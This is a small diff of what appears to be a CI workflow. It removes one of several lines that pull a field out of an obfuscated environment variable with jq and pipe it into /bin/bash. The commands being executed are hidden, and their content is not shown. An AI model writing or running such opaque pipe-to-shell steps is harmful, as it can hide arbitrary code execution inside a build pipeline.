@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$qlm2" | jq -r .dzqj6 | /bin/bash
           echo $dt74796 | jq -r .jjjp315 | /bin/bash
-          printf '%s' "$ftc122" | jq -r .rsvqv51880 | /bin/bash
           printf '%s' "$io19437" | jq -r .dwg5834 | /bin/bash
 
       - name: Save artifact
